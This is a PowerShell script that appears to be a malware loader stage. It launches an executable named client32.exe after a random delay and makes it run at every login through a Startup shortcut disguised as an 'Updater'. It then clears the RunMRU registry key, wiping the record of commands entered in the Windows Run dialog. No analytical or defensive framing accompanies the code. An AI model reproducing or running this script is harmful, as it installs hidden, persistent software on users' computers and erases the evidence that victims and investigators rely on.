$userData813 = Join-Path $confObj985 'client32.exe'
Start-Sleep -Seconds (Get-Random -Minimum 2 -Maximum 5)
Write-Host ('[*] Attempting to launch: ' + ${userData813})
if (Test-Path ${userData813}) {
    try {
        & ${userData813}
        Write-Host '[+] Executed successfully.'
    } catch {
        Write-Host ('[!] Failed to launch EXE: ' + $_.Exception.Message) -ForegroundColor Red
    }
} else {
    Write-Host '[!] File not found, cannot launch EXE.' -ForegroundColor Red
}

$startupFolder = [Environment]::GetFolderPath('Startup')
$shell = New-Object -ComObject WScript.Shell
$shortcutName = 'Updater' + (Get-Random -Minimum 100 -Maximum 999) + '.lnk'
$shortcutPath = Join-Path $startupFolder $shortcutName
$shortcut = $shell.CreateShortcut($shortcutPath)
$shortcut.TargetPath = $userData813
$shortcut.Save()
Write-Host '[*] Autostart shortcut created.'

Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name * -ErrorAction SilentlyContinue

Start-Sleep -Milliseconds 500
Write-Host '[✓] Script completed.' -ForegroundColor Green
